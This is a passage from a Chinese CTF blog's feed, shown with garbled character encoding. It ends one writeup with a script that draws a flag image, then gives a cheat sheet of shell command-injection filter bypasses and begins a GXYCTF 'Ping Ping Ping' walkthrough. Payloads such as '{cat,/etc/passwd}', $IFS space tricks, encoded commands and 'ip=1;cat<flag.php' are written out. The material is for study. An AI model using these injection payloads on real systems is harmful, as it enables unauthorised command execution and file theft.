[<span class="number">274</span>, <span class="number">20</span>], [<span class="number">272</span>, <span class="number">22</span>], [<span class="number">271</span>, <span class="number">23</span>], [<span class="number">271</span>, <span class="number">26</span>], [<span class="number">268</span>, <span class="number">29</span>], [<span class="number">266</span>, <span class="number">33</span>], [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">265</span>, <span class="number">37</span>],</span><br><span class="line">               [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">262</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">44</span>], [<span class="number">261</span>, <span class="number">47</span>], [<span class="number">260</span>, <span class="number">49</span>], [<span class="number">259</span>, <span class="number">51</span>], [<span class="number">258</span>, <span class="number">55</span>], [<span class="number">258</span>, <span class="number">56</span>], [<span class="number">257</span>, <span class="number">58</span>],</span><br><span class="line">               [<span class="number">255</span>, <span class="number">61</span>], [<span class="number">254</span>, <span class="number">62</span>], [<span class="number">253</span>, <span class="number">63</span>], [<span class="number">253</span>, <span class="number">64</span>], [<span class="number">252</span>, <span class="number">65</span>], [<span class="number">251</span>, <span class="number">66</span>], [<span class="number">250</span>, <span class="number">67</span>], [<span class="number">249</span>, <span class="number">68</span>], [<span class="number">248</span>, <span class="number">69</span>],</span><br><span class="line">               [<span class="number">247</span>, <span class="number">70</span>], [<span class="number">246</span>, <span class="number">71</span>], [<span class="number">245</span>, <span class="number">72</span>], [<span class="number">244</span>, <span class="number">73</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">299</span>, <span class="number">65</span>], [<span class="number">300</span>, <span class="number">65</span>], [<span class="number">302</span>, <span class="number">65</span>],</span><br><span class="line">               [<span class="number">304</span>, <span class="number">65</span>], [<span class="number">306</span>, <span class="number">65</span>], [<span class="number">308</span>, <span class="number">65</span>], [<span class="number">309</span>, <span class="number">65</span>], [<span class="number">312</span>, <span class="number">65</span>], [<span class="number">315</span>, <span class="number">65</span>], [<span class="number">317</span>, <span class="number">65</span>], [<span class="number">319</span>, <span class="number">65</span>], [<span class="number">322</span>, <span class="number">65</span>],</span><br><span class="line">               [<span class="number">325</span>, <span class="number">65</span>], [<span class="number">327</span>, <span class="number">65</span>], [<span class="number">330</span>, <span class="number">65</span>], [<span class="number">332</span>, <span class="number">65</span>], [<span class="number">334</span>, <span class="number">66</span>], [<span class="number">335</span>, <span class="number">66</span>], [<span class="number">20</span>, <span class="number">103</span>], [<span class="number">20</span>, <span class="number">104</span>], [<span class="number">20</span>, <span class="number">107</span>],</span><br><span class="line">               [<span class="number">20</span>, <span class="number">110</span>], [<span class="number">20</span>, <span class="number">112</span>], [<span class="number">20</span>, <span class="number">114</span>], [<span class="number">20</span>, <span class="number">118</span>], [<span class="number">19</span>, <span class="number">121</span>], [<span class="number">18</span>, <span class="number">124</span>], [<span class="number">17</span>, <span class="number">126</span>], [<span class="number">17</span>, <span class="number">130</span>], [<span class="number">17</span>, <span class="number">134</span>],</span><br><span class="line">               [<span class="number">17</span>, <span class="number">137</span>], [<span class="number">17</span>, <span class="number">139</span>], [<span class="number">17</span>, <span class="number">142</span>], [<span class="number">17</span>, <span class="number">143</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">17</span>, <span class="number">147</span>], [<span class="number">17</span>, <span class="number">149</span>], [<span class="number">17</span>, <span class="number">150</span>], [<span class="number">17</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">17</span>, <span class="number">148</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">18</span>, <span class="number">145</span>], [<span class="number">18</span>, <span class="number">143</span>], [<span class="number">19</span>, <span class="number">142</span>], [<span class="number">20</span>, <span class="number">141</span>], [<span class="number">20</span>, <span class="number">140</span>], [<span class="number">21</span>, <span class="number">138</span>], [<span class="number">21</span>, <span class="number">137</span>],</span><br><span class="line">               [<span class="number">22</span>, <span class="number">135</span>], [<span class="number">23</span>, <span class="number">134</span>], [<span class="number">24</span>, <span class="number">132</span>], [<span class="number">25</span>, <span class="number">131</span>], [<span class="number">26</span>, <span class="number">129</span>], [<span class="number">27</span>, <span class="number">128</span>], [<span class="number">28</span>, <span class="number">127</span>], [<span class="number">29</span>, <span class="number">126</span>], [<span class="number">31</span>, <span class="number">125</span>],</span><br><span class="line">               [<span class="number">32</span>, <span class="number">124</span>], [<span class="number">32</span>, <span class="number">123</span>], [<span class="number">34</span>, <span class="number">121</span>], [<span class="number">35</span>, <span class="number">120</span>], [<span class="number">37</span>, <span class="number">120</span>], [<span class="number">38</span>, <span class="number">119</span>], [<span class="number">40</span>, <span class="number">118</span>], [<span class="number">41</span>, <span class="number">118</span>], [<span class="number">43</span>, <span class="number">117</span>],</span><br><span class="line">               [<span class="number">44</span>, <span class="number">116</span>], [<span class="number">46</span>, <span class="number">115</span>], [<span class="number">48</span>, <span class="number">115</span>], [<span class="number">49</span>, <span class="number">114</span>], [<span class="number">50</span>, <span class="number">113</span>], [<span class="number">51</span>, <span class="number">113</span>], [<span class="number">52</span>, <span class="number">112</span>], [<span class="number">80</span>, <span class="number">121</span>], [<span class="number">80</span>, <span class="number">121</span>],</span><br><span class="line">               [<span class="number">79</span>, <span class="number">120</span>], [<span class="number">78</span>, <span class="number">121</span>], [<span class="number">77</span>, <span class="number">122</span>], [<span class="number">77</span>, <span class="number">123</span>], [<span class="number">77</span>, <span class="number">124</span>], [<span class="number">76</span>, <span class="number">127</span>], [<span class="number">75</span>, <span class="number">128</span>], [<span class="number">74</span>, <span class="number">129</span>], [<span class="number">73</span>, <span class="number">131</span>],</span><br><span class="line">               [<span class="number">73</span>, <span class="number">132</span>], [<span class="number">73</span>, <span class="number">133</span>], [<span class="number">72</span>, <span class="number">135</span>], [<span class="number">72</span>, <span class="number">136</span>], [<span class="number">72</span>, <span class="number">137</span>], [<span class="number">72</span>, <span class="number">138</span>], [<span class="number">72</span>, <span class="number">139</span>], [<span class="number">72</span>, <span class="number">140</span>], [<span class="number">72</span>, <span class="number">142</span>],</span><br><span class="line">               [<span class="number">72</span>, <span class="number">144</span>], [<span class="number">72</span>, <span class="number">145</span>], [<span class="number">73</span>, <span class="number">148</span>], [<span class="number">74</span>, <span class="number">149</span>], [<span class="number">77</span>, <span class="number">150</span>], [<span class="number">78</span>, <span class="number">150</span>], [<span class="number">80</span>, <span class="number">151</span>], [<span class="number">81</span>, <span class="number">151</span>], [<span class="number">82</span>, <span class="number">151</span>],</span><br><span class="line">               [<span class="number">83</span>, <span class="number">151</span>], [<span class="number">84</span>, <span class="number">151</span>], [<span class="number">85</span>, <span class="number">151</span>], [<span class="number">87</span>, <span class="number">151</span>], [<span class="number">89</span>, <span class="number">151</span>], [<span class="number">90</span>, <span class="number">151</span>], [<span class="number">92</span>, <span class="number">150</span>], [<span class="number">93</span>, <span class="number">150</span>], [<span class="number">95</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">97</span>, <span class="number">147</span>], [<span class="number">98</span>, <span class="number">146</span>], [<span class="number">99</span>, <span class="number">146</span>], [<span class="number">100</span>, <span class="number">145</span>], [<span class="number">101</span>, <span class="number">144</span>], [<span class="number">102</span>, <span class="number">142</span>], [<span class="number">102</span>, <span class="number">141</span>], [<span class="number">104</span>, <span class="number">139</span>], [<span class="number">104</span>, <span class="number">138</span>],</span><br><span class="line">               [<span class="number">105</span>, <span class="number">136</span>], [<span class="number">105</span>, <span class="number">135</span>], [<span class="number">105</span>, <span class="number">133</span>], [<span class="number">105</span>, <span class="number">132</span>], [<span class="number">105</span>, <span class="number">131</span>], [<span class="number">105</span>, <span class="number">129</span>], [<span class="number">104</span>, <span class="number">128</span>], [<span class="number">103</span>, <span class="number">126</span>],</span><br><span class="line">               [<span class="number">102</span>, <span class="number">126</span>], [<span class="number">101</span>, <span class="number">125</span>], [<span class="number">98</span>, <span class="number">123</span>], [<span class="number">96</span>, <span class="number">123</span>], [<span class="number">95</span>, <span class="number">123</span>], [<span class="number">93</span>, <span class="number">123</span>], [<span class="number">92</span>, <span class="number">122</span>], [<span class="number">90</span>, <span class="number">121</span>], [<span class="number">89</span>, <span class="number">121</span>],</span><br><span class="line">               [<span class="number">86</span>, <span class="number">120</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">146</span>, <span class="number">99</span>], [<span class="number">145</span>, <span class="number">100</span>], [<span class="number">144</span>, <span class="number">103</span>], [<span class="number">143</span>, <span class="number">104</span>], [<span class="number">142</span>, <span class="number">105</span>], [<span class="number">142</span>, <span class="number">106</span>],</span><br><span class="line">               [<span class="number">142</span>, <span class="number">109</span>], [<span class="number">142</span>, <span class="number">111</span>], [<span class="number">142</span>, <span class="number">114</span>], [<span class="number">141</span>, <span class="number">118</span>], [<span class="number">140</span>, <span class="number">120</span>], [<span class="number">139</span>, <span class="number">123</span>], [<span class="number">138</span>, <span class="number">127</span>], [<span class="number">138</span>, <span class="number">129</span>],</span><br><span class="line">               [<span class="number">137</span>, <span class="number">133</span>], [<span class="number">135</span>, <span class="number">135</span>], [<span class="number">134</span>, <span class="number">137</span>], [<span class="number">133</span>, <span class="number">139</span>], [<span class="number">131</span>, <span class="number">142</span>], [<span class="number">131</span>, <span class="number">143</span>], [<span class="number">131</span>, <span class="number">145</span>], [<span class="number">130</span>, <span class="number">146</span>],</span><br><span class="line">               [<span class="number">129</span>, <span class="number">149</span>], [<span class="number">128</span>, <span class="number">152</span>], [<span class="number">128</span>, <span class="number">153</span>], [<span class="number">127</span>, <span class="number">156</span>], [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">126</span>, <span class="number">158</span>], [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">129</span>, <span class="number">157</span>],</span><br><span class="line">               [<span class="number">130</span>, <span class="number">156</span>], [<span class="number">132</span>, <span class="number">156</span>], [<span class="number">134</span>, <span class="number">155</span>], [<span class="number">137</span>, <span class="number">153</span>], [<span class="number">138</span>, <span class="number">152</span>], [<span class="number">139</span>, <span class="number">151</span>], [<span class="number">140</span>, <span class="number">150</span>], [<span class="number">143</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">144</span>, <span class="number">148</span>], [<span class="number">145</span>, <span class="number">147</span>], [<span class="number">146</span>, <span class="number">146</span>], [<span class="number">147</span>, <span class="number">145</span>], [<span class="number">149</span>, <span class="number">144</span>], [<span class="number">149</span>, <span class="number">143</span>], [<span class="number">150</span>, <span class="number">142</span>], [<span class="number">151</span>, <span class="number">141</span>],</span><br><span class="line">               [<span class="number">152</span>, <span class="number">140</span>], [<span class="number">152</span>, <span class="number">139</span>], [<span class="number">153</span>, <span class="number">138</span>], [<span class="number">153</span>, <span class="number">137</span>], [<span class="number">153</span>, <span class="number">136</span>], [<span class="number">153</span>, <span class="number">135</span>], [<span class="number">153</span>, <span class="number">134</span>], [<span class="number">153</span>, <span class="number">133</span>],</span><br><span class="line">               [<span class="number">152</span>, <span class="number">132</span>], [<span class="number">151</span>, <span class="number">131</span>], [<span class="number">150</span>, <span class="number">131</span>], [<span class="number">149</span>, <span class="number">130</span>], [<span class="number">147</span>, <span class="number">129</span>], [<span class="number">186</span>, <span class="number">136</span>], [<span class="number">186</span>, <span class="number">136</span>], [<span class="number">183</span>, <span class="number">137</span>],</span><br><span class="line">               [<span class="number">182</span>, <span class="number">138</span>], [<span class="number">182</span>, <span class="number">139</span>], [<span class="number">182</span>, <span class="number">140</span>], [<span class="number">181</span>, <span class="number">142</span>], [<span class="number">179</span>, <span class="number">144</span>], [<span class="number">179</span>, <span class="number">145</span>], [<span class="number">179</span>, <span class="number">147</span>], [<span class="number">178</span>, <span class="number">149</span>],</span><br><span class="line">               [<span class="number">177</span>, <span class="number">150</span>], [<span class="number">177</span>, <span class="number">151</span>], [<span class="number">177</span>, <span class="number">152</span>], [<span class="number">177</span>, <span class="number">154</span>], [<span class="number">177</span>, <span class="number">156</span>], [<span class="number">177</span>, <span class="number">157</span>], [<span class="number">177</span>, <span class="number">158</span>], [<span class="number">178</span>, <span class="number">160</span>],</span><br><span class="line">               [<span class="number">179</span>, <span class="number">161</span>], [<span class="number">180</span>, <span class="number">162</span>], [<span class="number">181</span>, <span class="number">163</span>], [<span class="number">182</span>, <span class="number">164</span>], [<span class="number">184</span>, <span class="number">164</span>], [<span class="number">186</span>, <span class="number">164</span>], [<span class="number">187</span>, <span class="number">164</span>], [<span class="number">188</span>, <span class="number">164</span>],</span><br><span class="line">               [<span class="number">190</span>, <span class="number">163</span>], [<span class="number">191</span>, <span class="number">162</span>], [<span class="number">192</span>, <span class="number">162</span>], [<span class="number">194</span>, <span class="number">160</span>], [<span class="number">196</span>, <span class="number">159</span>], [<span class="number">197</span>, <span class="number">158</span>], [<span class="number">197</span>, <span class="number">156</span>], [<span class="number">198</span>, <span class="number">155</span>],</span><br><span class="line">               [<span class="number">200</span>, <span class="number">153</span>], [<span class="number">200</span>, <span class="number">152</span>], [<span class="number">201</span>, <span class="number">150</span>], [<span class="number">201</span>, <span class="number">149</span>], [<span class="number">201</span>, <span class="number">148</span>], [<span class="number">201</span>, <span class="number">147</span>], [<span class="number">201</span>, <span class="number">145</span>], [<span class="number">201</span>, <span class="number">144</span>],</span><br><span class="line">               [<span class="number">201</span>, <span class="number">142</span>], [<span class="number">201</span>, <span class="number">141</span>], [<span class="number">201</span>, <span class="number">139</span>], [<span class="number">201</span>, <span class="number">138</span>], [<span class="number">200</span>, <span class="number">136</span>], [<span class="number">199</span>, <span class="number">135</span>], [<span class="number">198</span>, <span class="number">135</span>], [<span class="number">197</span>, <span class="number">135</span>],</span><br><span class="line">               [<span class="number">196</span>, <span class="number">135</span>], [<span class="number">195</span>, <span class="number">135</span>], [<span class="number">193</span>, <span class="number">135</span>], [<span class="number">192</span>, <span class="number">135</span>], [<span class="number">190</span>, <span class="number">135</span>], [<span class="number">189</span>, <span class="number">135</span>], [<span class="number">223</span>, <span class="number">167</span>], [<span class="number">223</span>, <span class="number">167</span>],</span><br><span class="line">               [<span class="number">224</span>, <span class="number">167</span>], [<span class="number">226</span>, <span class="number">167</span>], [<span class="number">228</span>, <span class="number">167</span>], [<span class="number">229</span>, <span class="number">167</span>], [<span class="number">232</span>, <span class="number">167</span>], [<span class="number">233</span>, <span class="number">167</span>], [<span class="number">234</span>, <span class="number">167</span>], [<span class="number">235</span>, <span class="number">167</span>],</span><br><span class="line">               [<span class="number">237</span>, <span class="number">167</span>], [<span class="number">238</span>, <span class="number">167</span>], [<span class="number">240</span>, <span class="number">167</span>], [<span class="number">241</span>, <span class="number">167</span>], [<span class="number">243</span>, <span class="number">167</span>], [<span class="number">244</span>, <span class="number">167</span>], [<span class="number">246</span>, <span class="number">167</span>], [<span class="number">247</span>, <span class="number">167</span>],</span><br><span class="line">               [<span class="number">250</span>, <span class="number">168</span>], [<span class="number">251</span>, <span class="number">168</span>], [<span class="number">252</span>, <span class="number">168</span>], [<span class="number">253</span>, <span class="number">168</span>], [<span class="number">254</span>, <span class="number">168</span>], [<span class="number">269</span>, <span class="number">135</span>], [<span class="number">271</span>, <span class="number">136</span>], [<span class="number">273</span>, <span class="number">138</span>],</span><br><span class="line">               [<span class="number">275</span>, <span class="number">140</span>], [<span class="number">276</span>, <span class="number">141</span>], [<span class="number">278</span>, <span class="number">143</span>], [<span class="number">280</span>, <span class="number">145</span>], [<span class="number">282</span>, <span class="number">147</span>], [<span class="number">284</span>, <span class="number">149</span>], [<span class="number">285</span>, <span class="number">150</span>], [<span class="number">288</span>, <span class="number">152</span>],</span><br><span class="line">               [<span class="number">289</span>, <span class="number">153</span>], [<span class="number">291</span>, <span class="number">154</span>], [<span class="number">293</span>, <span class="number">156</span>], [<span class="number">294</span>, <span class="number">157</span>], [<span class="number">296</span>, <span class="number">159</span>], [<span class="number">297</span>, <span class="number">160</span>], [<span class="number">298</span>, <span class="number">161</span>], [<span class="number">299</span>, <span class="number">162</span>],</span><br><span class="line">               [<span class="number">300</span>, <span class="number">136</span>], [<span class="number">299</span>, <span class="number">136</span>], [<span class="number">297</span>, <span class="number">137</span>], [<span class="number">296</span>, <span class="number">138</span>], [<span class="number">294</span>, <span class="number">141</span>], [<span class="number">294</span>, <span class="number">142</span>], [<span class="number">293</span>, <span class="number">144</span>], [<span class="number">293</span>, <span class="number">145</span>],</span><br><span class="line">               [<span class="number">292</span>, <span class="number">148</span>], [<span class="number">291</span>, <span class="number">149</span>], [<span class="number">290</span>, <span class="number">151</span>], [<span class="number">288</span>, <span class="number">153</span>], [<span class="number">288</span>, <span class="number">155</span>], [<span class="number">287</span>, <span class="number">156</span>], [<span class="number">286</span>, <span class="number">157</span>], [<span class="number">285</span>, <span class="number">159</span>],</span><br><span class="line">               [<span class="number">284</span>, <span class="number">160</span>], [<span class="number">283</span>, <span class="number">161</span>], [<span class="number">282</span>, <span class="number">162</span>], [<span class="number">281</span>, <span class="number">163</span>], [<span class="number">280</span>, <span class="number">164</span>], [<span class="number">279</span>, <span class="number">165</span>], [<span class="number">327</span>, <span class="number">142</span>], [<span class="number">328</span>, <span class="number">143</span>],</span><br><span class="line">               [<span class="number">330</span>, <span class="number">145</span>], [<span class="number">332</span>, <span class="number">148</span>], [<span class="number">333</span>, <span class="number">149</span>], [<span class="number">335</span>, <span class="number">151</span>], [<span class="number">337</span>, <span class="number">154</span>], [<span class="number">339</span>, <span class="number">156</span>], [<span class="number">341</span>, <span class="number">158</span>], [<span class="number">342</span>, <span class="number">159</span>],</span><br><span class="line">               [<span class="number">345</span>, <span class="number">160</span>], [<span class="number">347</span>, <span class="number">161</span>], [<span class="number">348</span>, <span class="number">162</span>], [<span class="number">350</span>, <span class="number">164</span>], [<span class="number">351</span>, <span class="number">165</span>], [<span class="number">352</span>, <span class="number">166</span>], [<span class="number">355</span>, <span class="number">168</span>], [<span class="number">356</span>, <span class="number">169</span>],</span><br><span class="line">               [<span class="number">351</span>, <span class="number">143</span>], [<span class="number">350</span>, <span class="number">143</span>], [<span class="number">348</span>, <span class="number">144</span>], [<span class="number">347</span>, <span class="number">144</span>], [<span class="number">346</span>, <span class="number">145</span>], [<span class="number">343</span>, <span class="number">148</span>], [<span class="number">341</span>, <span class="number">150</span>], [<span class="number">339</span>, <span class="number">152</span>],</span><br><span class="line">               [<span class="number">336</span>, <span class="number">155</span>], [<span class="number">333</span>, <span class="number">158</span>], [<span class="number">330</span>, <span class="number">159</span>], [<span class="number">327</span>, <span class="number">162</span>], [<span class="number">325</span>, <span class="number">165</span>], [<span class="number">323</span>, <span class="number">167</span>], [<span class="number">322</span>, <span class="number">168</span>], [<span class="number">319</span>, <span class="number">170</span>],</span><br><span class="line">               [<span class="number">317</span>, <span class="number">171</span>], [<span class="number">316</span>, <span class="number">171</span>], [<span class="number">314</span>, <span class="number">172</span>], [<span class="number">313</span>, <span class="number">172</span>]]</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">500</span>, <span class="number">500</span>), <span class="string">&#x27;white&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> location <span class="keyword">in</span> XYlocation:</span><br><span class="line">    im.putpixel((location[<span class="number">0</span>], location[<span class="number">1</span>]), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">im.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›¾ç‰‡</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/biO41VfdERQr2CD.png"></p><p>æœ€åæ ¹æ®é¢˜ç›®æç¤ºè½¬MD5å†æäº¤å°±å¯ä»¥äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;easy-sql&quot;&gt;&lt;a href=&quot;#easy-sql&quot; class=&quot;headerlink&quot; title=&quot;easy_</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://lucifer-rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://lucifer-rossweisse.github.io/tags/CTF/"/>
    
    <category term="CISCN" scheme="https://lucifer-rossweisse.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>å‘½ä»¤æ³¨å…¥å°æ€»ç»“</title>
    <link href="https://lucifer-rossweisse.github.io/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://lucifer-rossweisse.github.io/2021/03/29/web%E5%AD%A6%E4%B9%A0/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2021-03-29T04:56:01.000Z</published>
    <updated>2021-07-23T03:25:57.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“"></a>å‘½ä»¤æ³¨å…¥çŸ¥è¯†ç‚¹æ€»ç»“</h2><h3 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1ã€%20(space)ã€%09(tab)ã€$IFS<span class="variable">$9</span>ã€ IFSã€IFS</span><br><span class="line">2ã€ä½¿ç”¨&lt;æˆ–è€…&lt;&gt;æ¥ç»•è¿‡ç©ºæ ¼ cat&lt;a.txt</span><br><span class="line">3ã€èŠ±æ‹¬å·æ‰©å±•&#123;OS_COMMAND,ARGUMENT&#125; &#123;cat,/etc/passwd&#125;</span><br><span class="line">4ã€<span class="variable">$IFS</span> ç©ºæ ¼ç»•è¿‡ cat<span class="variable">$IFSa</span>.txt</span><br><span class="line">5ã€å˜é‡æ§åˆ¶ X=$<span class="string">&#x27;cat\x09./flag.php</span></span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤å…³é”®å­—"><a href="#è¿‡æ»¤å…³é”®å­—" class="headerlink" title="è¿‡æ»¤å…³é”®å­—"></a>è¿‡æ»¤å…³é”®å­—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1ã€ä½¿ç”¨ç©ºå˜é‡ ä½¿ç”¨$*å’Œ<span class="variable">$@</span>ï¼Œ<span class="variable">$x</span>(x ä»£è¡¨ 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10)(æˆ‘å°è¯•å°äº 10 ä¹Ÿæ˜¯å¯ä»¥çš„) å› ä¸ºåœ¨æ²¡æœ‰ä¼ å‚çš„æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ç‰¹æ®Šå˜é‡éƒ½æ˜¯ä¸ºç©ºçš„ ca<span class="variable">$&#123;21&#125;</span>t a.txt</span><br><span class="line">2ã€åæ–œæ  ca\t a.txt</span><br><span class="line">3ã€å˜é‡æ›¿æ¢ a=ca;b=t;c=a.txt;a aab <span class="variable">$c</span></span><br><span class="line">4ã€å¼•å· c<span class="string">&#x27;a&#x27;</span>t flag.php</span><br><span class="line">5ã€ç¼–ç ç»•è¿‡</span><br><span class="line">    Base64 ç¼–ç ç»•è¿‡ï¼š</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27;| base64 Y2F0IGEudHh0Cg==</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;Y2F0IGEudHh0Cg==&#x27; | base64 -d abc</span></span><br><span class="line">    åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼š</span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;cat a.txt&#x27; | xxd -p 63617420612e7478740a</span></span><br><span class="line">    root@kali:~/<span class="comment"># echo &#x27;0x63617420612e7478740a&#x27;| xxd -r -p Abc</span></span><br><span class="line">6ã€é€šé…ç¬¦ ï¼Ÿ*</span><br><span class="line">    [â€¦]ï¼šåŒ¹é…èŒƒå›´ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦ cat fl[abc]g.php</span><br><span class="line">    [a-z]ï¼šåŒ¹é… a-z èŒƒå›´ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦ cat fl[a-z]g.php</span><br><span class="line">    &#123;a,b&#125;ï¼šå¯¹ä»¥é€—å·åˆ†å‰²çš„æ–‡ä»¶åˆ—è¡¨è¿›è¡Œæ‹“å±• cat fl&#123;b,c&#125;g.php</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤"><a href="#å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤" class="headerlink" title="å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤"></a>å‘½ä»¤åˆ†éš”ä¸æ‰§è¡Œå¤šæ¡å‘½ä»¤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; è¡¨ç¤ºå°†ä»»åŠ¡ç½®äºåå°æ‰§è¡Œ</span><br><span class="line">ä¾‹ï¼šcommand1 &amp; command2    å…ˆæ‰§è¡Œcommand2åæ‰§è¡Œcommand1</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">åªæœ‰åœ¨ &amp;&amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ&amp;&amp; å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚</span><br><span class="line">ä¾‹ï¼šcommand1 &amp;&amp; command2   å…ˆæ‰§è¡Œcommand1åæ‰§è¡Œcommand2</span><br><span class="line">3.|</span><br><span class="line">| è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°</span><br><span class="line">ä¾‹ï¼šcommand1 | command2     åªæ‰§è¡Œcommand2</span><br><span class="line">4.||</span><br><span class="line">åªæœ‰åœ¨ || å·¦è¾¹çš„å‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œ|| å³è¾¹çš„å‘½ä»¤æ‰ ä¼šè¢«æ‰§è¡Œã€‚</span><br><span class="line">ä¾‹ï¼š7 || ls /</span><br><span class="line">5.ï¼›</span><br><span class="line">å¤šè¡Œè¯­å¥ç”¨æ¢è¡ŒåŒºåˆ†ä»£ç å¿«ï¼Œå•è¡Œè¯­å¥ä¸€èˆ¬è¦ç”¨åˆ°åˆ†å·æ¥åŒºåˆ†ä»£ç å—</span><br><span class="line">ä¾‹ï¼šping 127.0.0.1;ls /</span><br></pre></td></tr></table></figure><h2 id="çœŸé¢˜Writeup"><a href="#çœŸé¢˜Writeup" class="headerlink" title="çœŸé¢˜Writeup"></a>çœŸé¢˜Writeup</h2><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>è¿›å…¥é¢˜ç›®ç¨å¾®æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ip=1 &amp; ls</span><br><span class="line">è¿”å› fxck your space! <span class="comment"># è¿‡æ»¤äº†ç©ºæ ¼</span></span><br><span class="line"></span><br><span class="line">ip=1;ls</span><br><span class="line">è¿”å› <span class="comment"># çœ‹æ¥åˆ†å·æ²¡æœ‰è¢«è¿‡æ»¤</span></span><br><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br><span class="line"></span><br><span class="line">ip=1;cat&lt;flag.php</span><br><span class="line">è¿”å› fxck your symbol! <span class="comment"># è¿‡æ»¤äº†&lt; å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line">ip=1;cat/**/flag.php</span><br><span class="line">è¿”å› fxck your symbol! 